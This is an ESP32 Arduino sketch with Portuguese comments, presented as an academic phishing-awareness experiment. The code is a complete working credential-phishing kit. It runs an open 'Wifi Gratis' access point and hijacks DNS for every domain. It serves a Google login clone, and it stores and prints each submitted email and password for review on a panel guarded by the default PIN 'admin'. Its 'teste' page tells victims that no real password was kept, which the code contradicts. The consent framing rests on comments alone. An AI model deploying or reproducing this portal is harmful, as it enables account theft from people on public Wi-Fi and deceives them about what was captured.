/*
 * PhishLab ESP32 — Captive Portal para conscientização sobre phishing
 * -------------------------------------------------------------------
 * USO ACADÊMICO / AUTORIZADO: experimento de conscientização sobre phishing,
 * executado em ambiente fechado e com participantes cientes do experimento.
 * Objetivo: medir o índice de suscetibilidade das pessoas a um portal falso.
 *
 * ⚠️  Use apenas em hardware próprio e em ambiente controlado, com pessoas
 *     que consentiram em participar. Capturar credenciais de terceiros sem
 *     autorização é crime. Veja o README e o LICENSE antes de usar.
 *
 * Funcionamento:
 *   1. O ESP32 sobe um Access Point aberto ("Wifi Gratis").
 *   2. Um servidor DNS responde TODOS os domínios com o IP do ESP, forçando
 *      o sistema operacional do celular a abrir o "captive portal".
 *   3. O participante vê uma página de login (Google) e digita as credenciais.
 *   4. Em vez de "roubar" de fato, o portal revela na hora que era um teste
 *      e ensina como se proteger (página educativa pós-captura).
 *   5. As entradas ficam em memória RAM e podem ser vistas pelo pesquisador
 *      na rota /creds (protegida por PIN) — apenas para medir o índice de
 *      acerto do experimento.
 *
 * Placa: ESP32 (chip USB-UART CP2102) | Porta: /dev/cu.usbserial-0001
 */

#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <vector>

const char *nomeDaRede = "Wifi Gratis";        // Nome do Wi-Fi falso (aberto)
const char *senhaDaRede = "";                  // Sem senha = rede aberta
const byte portaDNS = 53;
IPAddress ipDoPortal(8, 8, 8, 8);              // IP do ESP no modo Access Point
const char *pinDoPainel = "admin";             // PIN do painel /creds — placeholder PÚBLICO, TROQUE antes de usar

DNSServer servidorDNS;
AsyncWebServer servidorWeb(80);

// Estrutura que guarda cada par de credenciais capturado
struct Credencial {
  String email;
  String senha;
};

std::vector<Credencial> credenciaisCapturadas;  // Lista de capturas (em RAM)
unsigned long momentoInicio;

// Página de login falsa (clone do Google) com o logo em SVG
const char* paginaDeLogin = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: 'Roboto', Arial, sans-serif;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #ffffff;
    }
    .login-container {
      width: 450px;
      max-width: 90%;
      padding: 48px 40px 36px;
      border: 1px solid #dadce0;
      border-radius: 8px;
      text-align: center;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
    .google-logo {
      height: 40px;
      margin-bottom: 16px;
    }
    h1 {
      color: #202124;
      font-size: 24px;
      font-weight: 400;
      margin-bottom: 10px;
    }
    .subtitle {
      color: #202124;
      font-size: 16px;
      font-weight: 400;
      margin-bottom: 32px;
    }
    .form-group {
      margin-bottom: 24px;
      text-align: left;
    }
    .form-control {
      position: relative;
      height: 56px;
      width: calc(100% - 24px);
      padding: 12px;
      font-size: 16px;
      color: #202124;
      border: 1px solid #dadce0;
      border-radius: 4px;
      outline: none;
      transition: border-color 0.2s;
    }
    .form-control:focus {
      border-color: #1a73e8;
      box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
    }
    .btn {
      display: inline-block;
      background-color: #1a73e8;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 14px;
      font-weight: 500;
      padding: 10px 24px;
      cursor: pointer;
      text-transform: none;
      letter-spacing: .25px;
      transition: background-color 0.2s;
    }
    .btn:hover {
      background-color: #287ae6;
    }
    .footer {
      display: flex;
      justify-content: space-between;
      margin-top: 32px;
    }
    .footer a {
      color: #1a73e8;
      text-decoration: none;
      font-weight: 500;
      font-size: 14px;
    }
    form {
      width: 100%;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <!-- Logo do Google em SVG -->
    <svg class="google-logo" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
      <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
      <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
      <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
      <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
      <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
      <path d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z" fill="#4285F4"/>
    </svg>
    <h1>Fazer login</h1>
    <p class="subtitle">Use sua Conta do Google</p>
    <form action="/" method="POST">
      <div class="form-group">
        <input type="email" class="form-control" name="user" placeholder="E-mail ou telefone" required>
      </div>
      <div class="form-group">
        <input type="password" class="form-control" name="pass" placeholder="Digite sua senha" required>
      </div>
      <div style="display: flex; justify-content: space-between; margin-top: 32px;">
        <a href="#" style="color: #1a73e8; text-decoration: none; margin-top: 8px;">Criar conta</a>
        <button type="submit" class="btn">Avançar</button>
      </div>
    </form>
  </div>
</body>
</html>
)rawliteral";

// Página educativa exibida DEPOIS que o participante envia as credenciais.
// Em vez de simular um erro, revela na hora que era um teste de phishing
// e ensina como se proteger — esse é o objetivo pedagógico do experimento.
const char* paginaPosCaptura = R"rawliteral(
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <title>Você participou de um teste de phishing</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      background: linear-gradient(135deg, #1a73e8 0%, #0b3d91 100%);
    }
    .card {
      width: 100%;
      max-width: 480px;
      background: #ffffff;
      border-radius: 16px;
      padding: 40px 32px;
      box-shadow: 0 12px 40px rgba(0,0,0,0.25);
      text-align: center;
      animation: surge 0.4s ease;
    }
    @keyframes surge {
      from { opacity: 0; transform: translateY(16px); }
      to   { opacity: 1; transform: translateY(0); }
    }
    .icon {
      width: 72px;
      height: 72px;
      line-height: 72px;
      margin: 0 auto 20px;
      border-radius: 50%;
      background: #fef3c7;
      font-size: 38px;
    }
    h1 {
      color: #b91c1c;
      font-size: 24px;
      font-weight: 700;
      margin: 0 0 12px;
    }
    p {
      color: #3c4043;
      font-size: 15px;
      line-height: 1.6;
      margin: 0 0 16px;
    }
    .tips {
      text-align: left;
      background: #f8f9fa;
      border-radius: 10px;
      padding: 16px 20px;
      margin: 20px 0 8px;
    }
    .tips strong { color: #202124; font-size: 14px; }
    .tips ul { margin: 10px 0 0; padding-left: 20px; }
    .tips li { color: #3c4043; font-size: 14px; line-height: 1.7; }
    .footnote {
      color: #80868b;
      font-size: 12px;
      margin-top: 24px;
      line-height: 1.5;
    }
    .badge {
      display: inline-block;
      background: #e6f4ea;
      color: #137333;
      font-size: 12px;
      font-weight: 600;
      padding: 4px 12px;
      border-radius: 999px;
      margin-top: 8px;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">⚠️</div>
    <h1>Isto era um teste de phishing</h1>
    <p>
      Você acabou de digitar suas credenciais em uma página <strong>falsa</strong>,
      servida por um Wi-Fi público aberto. Em um ataque real, sua senha já teria
      sido roubada.
    </p>
    <span class="badge">✓ Calma: nenhuma senha real foi guardada</span>
    <div class="tips">
      <strong>Como se proteger na próxima vez:</strong>
      <ul>
        <li>Desconfie de Wi-Fi aberto que pede login de e-mail ou redes sociais.</li>
        <li>Confira sempre o endereço (URL) e o cadeado antes de digitar a senha.</li>
        <li>Ative a verificação em duas etapas nas suas contas.</li>
        <li>Use um gerenciador de senhas — ele não preenche em sites falsos.</li>
      </ul>
    </div>
    <p class="footnote">
      Experimento acadêmico de conscientização sobre segurança digital.
      Realizado em ambiente controlado e com participantes cientes.
    </p>
  </div>
</body>
</html>
)rawliteral";

// Página de login do painel, protegida por PIN (rota /creds)
const char* paginaDoPin = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>Acesso Restrito</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: Arial; padding: 20px; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .container { max-width: 400px; width: 100%; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    h2 { text-align: center; color: #333; }
    .form-group { margin-bottom: 15px; }
    label { display: block; margin-bottom: 5px; font-weight: bold; }
    input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
    .btn { width: 100%; padding: 10px 15px; background: #4285f4; color: white; border: none; border-radius: 5px; cursor: pointer; margin-top: 10px; }
    .error { color: red; text-align: center; margin-bottom: 15px; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Acesso Restrito</h2>
    %ERROR_MESSAGE%
    <form action="/creds-verify" method="POST">
      <div class="form-group">
        <label for="pin">PIN:</label>
        <input type="password" id="pin" name="pin" required>
      </div>
      <button type="submit" class="btn">Entrar</button>
    </form>
  </div>
</body>
</html>
)rawliteral";

// Calcula há quanto tempo o portal está no ar (formato dias/horas/min)
String tempoNoAr() {
  unsigned long segundos = millis() / 1000;
  unsigned int dias = segundos / 86400;
  segundos %= 86400;
  unsigned int horas = segundos / 3600;
  segundos %= 3600;
  unsigned int minutos = segundos / 60;

  char buffer[50];
  snprintf(buffer, sizeof(buffer), "%u dias, %u h, %u min", dias, horas, minutos);
  return String(buffer);
}

// Monta o HTML do painel com a lista de credenciais capturadas
String montarPainel() {
  String html = R"rawliteral(
  <!DOCTYPE html>
  <html>
  <head>
    <title>Credenciais Capturadas</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
      body { font-family: Arial; padding: 20px; background: #f5f5f5; }
      .container { max-width: 600px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
      .info { background: #e6f0ff; padding: 10px; border-radius: 5px; margin-bottom: 20px; }
      .btn { margin: 5px 5px 15px 0; padding: 10px 15px; background: #ff4d4d; color: white; border: none; border-radius: 5px; cursor: pointer; }
      .btn-update { background: #f39c12; }
      .entry { background: #eee; padding: 10px; margin-bottom: 10px; border-radius: 5px; }
    </style>
  </head>
  <body>
    <div class="container">
      <h2>Credenciais Capturadas</h2>
      <div class="info">
        Clientes conectados: )rawliteral" + String(WiFi.softAPgetStationNum()) + R"rawliteral(<br>
        Ativo desde: )rawliteral" + tempoNoAr() + R"rawliteral(</div>
      <form action="/clear" method="POST"><input class="btn" type="submit" value="Apagar credenciais"></form>
      <form action="/creds" method="GET"><input class="btn btn-update" type="submit" value="Atualizar"></form>
  )rawliteral";

  // Adiciona cada credencial capturada na lista
  for (auto &credencial : credenciaisCapturadas) {
    html += "<div class='entry'>E-mail: " + credencial.email + " | Senha: " + credencial.senha + "</div>";
  }

  html += "</div></body></html>";
  return html;
}

// Handler "coringa": qualquer requisição não tratada é redirecionada para o portal
class RedirecionadorDoPortal : public AsyncWebHandler {
public:
  RedirecionadorDoPortal() {}
  virtual ~RedirecionadorDoPortal() {}

  bool canHandle(AsyncWebServerRequest *request) {
    return true;
  }

  void handleRequest(AsyncWebServerRequest *request) {
    request->redirect("http://" + WiFi.softAPIP().toString());
  }
};

void setup() {
  Serial.begin(115200);

  // Configura o IP do Access Point
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(ipDoPortal, ipDoPortal, IPAddress(255, 255, 255, 0));
  WiFi.softAP(nomeDaRede, senhaDaRede);

  Serial.print("Endereço IP do AP: ");
  Serial.println(WiFi.softAPIP());

  // Servidor DNS: responde TODOS os domínios com o IP do ESP (DNS hijack)
  servidorDNS.start(portaDNS, "*", WiFi.softAPIP());

  momentoInicio = millis();

  // Endpoints que os sistemas operacionais usam para detectar captive portal
  servidorWeb.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request){
    request->redirect("http://" + WiFi.softAPIP().toString());
  });

  servidorWeb.on("/fwlink", HTTP_GET, [](AsyncWebServerRequest *request){
    request->redirect("http://" + WiFi.softAPIP().toString());
  });

  servidorWeb.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request){
    request->redirect("http://" + WiFi.softAPIP().toString());
  });

  servidorWeb.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request){
    request->redirect("http://" + WiFi.softAPIP().toString());
  });

  servidorWeb.on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest *request){
    request->redirect("http://" + WiFi.softAPIP().toString());
  });

  servidorWeb.on("/favicon.ico", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "image/x-icon", "");
  });

  // Rota principal: mostra a página de login falsa
  servidorWeb.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/html", paginaDeLogin);
  });

  // Recebe o POST do formulário e guarda as credenciais digitadas
  servidorWeb.on("/", HTTP_POST, [](AsyncWebServerRequest *request){
    if (request->hasParam("user", true) && request->hasParam("pass", true)) {
      String email = request->getParam("user", true)->value();
      String senha = request->getParam("pass", true)->value();
      credenciaisCapturadas.push_back({ email, senha });
      Serial.printf("[CAPTURADO] Login: %s / %s\n", email.c_str(), senha.c_str());
    }
    // Revela na hora que era um teste e ensina como se proteger (página educativa)
    request->send(200, "text/html", paginaPosCaptura);
  });

  // Página de login do painel (pede o PIN)
  servidorWeb.on("/creds", HTTP_GET, [](AsyncWebServerRequest *request){
    String html = String(paginaDoPin);
    html.replace("%ERROR_MESSAGE%", "");
    request->send(200, "text/html", html);
  });

  // Verifica o PIN do painel
  servidorWeb.on("/creds-verify", HTTP_POST, [](AsyncWebServerRequest *request){
    if (request->hasParam("pin", true)) {
      String pin = request->getParam("pin", true)->value();
      if (pin == pinDoPainel) {
        // PIN correto: mostra o painel com as credenciais
        request->send(200, "text/html", montarPainel());
      } else {
        // PIN incorreto: mostra mensagem de erro
        String html = String(paginaDoPin);
        html.replace("%ERROR_MESSAGE%", "<div class='error'>PIN incorreto! Tente novamente.</div>");
        request->send(200, "text/html", html);
      }
    } else {
      request->redirect("/creds");
    }
  });

  // Limpa a lista de credenciais capturadas
  servidorWeb.on("/clear", HTTP_POST, [](AsyncWebServerRequest *request){
    // Observação: proteção básica, pode ser contornada — suficiente para o experimento
    credenciaisCapturadas.clear();
    request->redirect("/creds");
  });

  // Handler de fallback para qualquer rota não definida acima
  servidorWeb.addHandler(new RedirecionadorDoPortal()).setFilter(ON_AP_FILTER);

  servidorWeb.begin();
  Serial.println("Captive Portal iniciado! Painel de credenciais em /creds (protegido por PIN).");
}

void loop() {
  servidorDNS.processNextRequest();
}
